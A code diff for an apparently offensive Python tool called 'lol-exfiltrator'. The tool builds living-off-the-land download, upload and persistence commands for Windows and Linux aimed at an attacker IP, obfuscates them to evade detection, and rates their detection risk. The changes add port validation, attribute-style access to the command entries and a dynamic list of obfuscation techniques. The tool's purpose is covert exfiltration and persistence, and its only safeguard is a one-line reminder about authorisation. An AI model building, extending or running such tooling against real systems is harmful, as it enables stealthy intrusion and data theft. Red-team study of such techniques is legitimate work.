@@ -6,7 +6,7 @@ import sys
 
 from commands.windows_lolbas  import WINDOWS_COMMANDS
 from commands.linux_gtfobins  import LINUX_COMMANDS
-from core.obfuscator          import obfuscate
+from core.obfuscator          import obfuscate, get_available_techniques
 from core.display             import (
     print_banner, print_section, print_result_header,
     print_clear_command, print_obfuscated_command,
@@ -16,13 +16,14 @@ from core.display             import (
 )
 
 
-
+# ── Constants ──────────────────────────────────────────────────
 
 SUPPORTED_OS      = ['windows', 'linux']
 SUPPORTED_ACTIONS = ['download', 'upload', 'persistence']
+DEFAULT_PORT      = '8080'
 
 
-
+# ── Core helpers ───────────────────────────────────────────────
 
 def get_commands(os_type: str, action: str) -> list:
     """Return the command list for the given OS and action."""
@@ -31,14 +32,39 @@ def get_commands(os_type: str, action: str) -> list:
 
 
 def build_command(template: str, ip: str, port: str, filename: str) -> str:
-    """Substitute placeholders in a command template."""
-    return (
-        template
-        .replace('{ip}', ip)
-        .replace('{port}', port)
-        .replace('{filename}', filename)
-    )
+    """Substitute placeholders in a command template.
 
+    FIX: Validates that at least one placeholder was actually replaced.
+    Warns (but does not crash) if a placeholder is missing.
+    """
+    result = template
+    replacements = {'{ip}': ip, '{port}': port, '{filename}': filename}
+    replaced_count = 0
+    for placeholder, value in replacements.items():
+        if placeholder in result:
+            result = result.replace(placeholder, value)
+            replaced_count += 1
+
+    if replaced_count == 0:
+        print_warning(
+            f"Template contains no recognised placeholders: {template[:60]}…"
+        )
+
+    return result
+
+
+def validate_port(port: str) -> str:
+    """Ensure port is a non-empty valid number. Falls back to DEFAULT_PORT."""
+    if not port:
+        print_warning(f"No port provided, defaulting to {DEFAULT_PORT}.")
+        return DEFAULT_PORT
+    if not port.isdigit() or not (1 <= int(port) <= 65535):
+        print_warning(f"Invalid port '{port}', defaulting to {DEFAULT_PORT}.")
+        return DEFAULT_PORT
+    return port
+
+
+# ── Interactive wizard ─────────────────────────────────────────
 
 def run_interactive(args: argparse.Namespace) -> None:
     """
@@ -47,8 +73,7 @@ def run_interactive(args: argparse.Namespace) -> None:
     """
     print_banner()
 
-
-
+    # ── Step 1: OS selection ──────────────────────────────────
     if args.os:
         os_type = args.os.lower()
         if os_type not in SUPPORTED_OS:
@@ -59,6 +84,7 @@ def run_interactive(args: argparse.Namespace) -> None:
         print_section("Step 1 › Select Target OS")
         os_type = prompt_choice("Target OS", [o.capitalize() for o in SUPPORTED_OS]).lower()
 
+    # ── Step 2: Action selection ──────────────────────────────
     if args.action:
         action = args.action.lower()
         if action not in SUPPORTED_ACTIONS:
@@ -69,31 +95,34 @@ def run_interactive(args: argparse.Namespace) -> None:
         print_section("Step 2 › Select Action")
         action = prompt_choice("Desired Action", [a.capitalize() for a in SUPPORTED_ACTIONS]).lower()
 
+    # ── Step 3: Target details ────────────────────────────────
     if action in ('download', 'upload'):
-
         attacker_ip   = args.ip   or prompt("Attacker IP", "192.168.1.100")
-        attacker_port = args.port or prompt("Attacker Port", "8080")
+        attacker_port = validate_port(args.port or prompt("Attacker Port", DEFAULT_PORT))
         filename      = args.filename or prompt("Remote Filename", "payload.exe")
     else:
-
         attacker_ip   = args.ip   or prompt("Callback IP (for payload URL)", "192.168.1.100")
-        attacker_port = args.port or prompt("Callback Port", "8080")
+        attacker_port = validate_port(args.port or prompt("Callback Port", DEFAULT_PORT))
         filename      = args.filename or prompt("Payload Filename (served over HTTP)", "shell.ps1")
 
-
+    # ── Fetch commands ────────────────────────────────────────
     commands = get_commands(os_type, action)
     if not commands:
         print_error(f"No commands found for OS='{os_type}' action='{action}'.")
         sys.exit(1)
 
-
+    # ── Binary filter ─────────────────────────────────────────
     if args.binary:
-        commands = [c for c in commands if args.binary.lower() in c['binary'].lower()]
-        if not commands:
-            print_warning(f"No commands match binary filter '{args.binary}'. Showing all.")
-            commands = get_commands(os_type, action)
+        filtered = [c for c in commands if args.binary.lower() in c.binary.lower()]
+        if not filtered:
+            print_error(
+                f"No commands match binary filter '{args.binary}'. "
+                f"Available binaries: {', '.join(sorted(set(c.binary for c in commands)))}"
+            )
+            sys.exit(1)
+        commands = filtered
 
-
+    # ── Display results ───────────────────────────────────────
     print_section(
         f"Results  ›  OS: {os_type.capitalize()}  |  Action: {action.capitalize()}  "
         f"|  Target: {attacker_ip}:{attacker_port}/{filename}"
@@ -102,32 +131,32 @@ def run_interactive(args: argparse.Namespace) -> None:
 
     for idx, cmd_entry in enumerate(commands, start=1):
         clear_cmd = build_command(
-            cmd_entry['template'],
+            cmd_entry.template,
             attacker_ip, attacker_port, filename
         )
 
         obf_result = obfuscate(
-            command  = clear_cmd,
-            os_type  = os_type,
-            binary   = cmd_entry['binary'],
-            ip       = attacker_ip,
-            technique= args.obf_technique or 'auto',
+            command   = clear_cmd,
+            os_type   = os_type,
+            binary    = cmd_entry.binary,
+            ip        = attacker_ip,
+            technique = args.obf_technique or 'auto',
         )
 
-        print_result_header(idx, cmd_entry['name'])
+        print_result_header(idx, cmd_entry.name)
         print_divider()
 
         print_clear_command(clear_cmd)
-        print_stealth_note(cmd_entry['stealth_note'])
+        print_stealth_note(cmd_entry.stealth_note)
         print()
 
         print_obfuscated_command(obf_result['obfuscated_command'])
         print_technique(obf_result['technique_used'])
         print_obf_explanation(obf_result['explanation'])
 
-        if cmd_entry.get('requires'):
+        if cmd_entry.requires:
             print()
-            print_requires(cmd_entry['requires'])
+            print_requires(cmd_entry.requires)
 
         print()
 
@@ -135,9 +164,13 @@ def run_interactive(args: argparse.Namespace) -> None:
     print_warning("Reminder: Use only on systems you are authorised to test.")
 
 
-
+# ── Argument parser ────────────────────────────────────────────
 
 def build_parser() -> argparse.ArgumentParser:
+    # Dynamically gather all valid technique names from the obfuscator
+    all_techniques = sorted(get_available_techniques('all').keys())
+    technique_choices = ['auto'] + all_techniques
+
     parser = argparse.ArgumentParser(
         prog        = 'lol-exfiltrator',
         description = (
@@ -179,7 +212,7 @@ def build_parser() -> argparse.ArgumentParser:
         '--port', '-p',
         metavar='PORT',
         default='',
-        help='Attacker listening port',
+        help=f'Attacker listening port (default: {DEFAULT_PORT})',
     )
     target.add_argument(
         '--filename', '-f',
@@ -200,15 +233,10 @@ def build_parser() -> argparse.ArgumentParser:
         dest    = 'obf_technique',
         metavar = 'TECHNIQUE',
         default = 'auto',
-        choices = ['auto', 'env_var', 'ps_iex', 'env_concat', 'hex_ip', 'unicode'],
+        choices = technique_choices,
         help    = (
             'Obfuscation strategy to apply (default: auto).\n'
-            '  auto       – chosen automatically per OS/binary\n'
-            '  env_var    – %%SystemRoot%% env-var expansion (Windows)\n'
-            '  ps_iex     – PowerShell IEX string-concat (Windows)\n'
-            '  env_concat – shell variable name splitting (Linux)\n'
-            '  hex_ip     – IP address to hex form (both)\n'
-            '  unicode    – URL percent-encoding (Linux)\n'
+            f'  Available: {", ".join(technique_choices)}\n'
         ),
     )
 
@@ -221,13 +249,13 @@ def build_parser() -> argparse.ArgumentParser:
     misc.add_argument(
         '--version', '-v',
         action  = 'version',
-        version = '%(prog)s 1.0.0',
+        version = '%(prog)s 1.1.0',
     )
 
     return parser
 
 
-
+# ── List mode ──────────────────────────────────────────────────
 
 def run_list_mode(args: argparse.Namespace) -> None:
     """Print a catalogue of available techniques without generating commands."""
@@ -246,11 +274,17 @@ def run_list_mode(args: argparse.Namespace) -> None:
                 continue
             print_section(f"{os_label}  ›  {action.capitalize()}")
             for i, entry in enumerate(entries, 1):
-                print_info(f"{i:2}.  {entry['name']}  ({entry['binary']})")
+                risk_icon = {'low': '🟢', 'medium': '🟡', 'high': '🔴'}.get(
+                    entry.detection_risk, '⚪'
+                )
+                print_info(
+                    f"{i:2}.  {entry.name}  ({entry.binary})  "
+                    f"{risk_icon} {entry.detection_risk}  [{entry.privilege}]"
+                )
     print()
 
 
-
+# ── Entry point ────────────────────────────────────────────────
 
 def main() -> None:
     parser = build_parser()
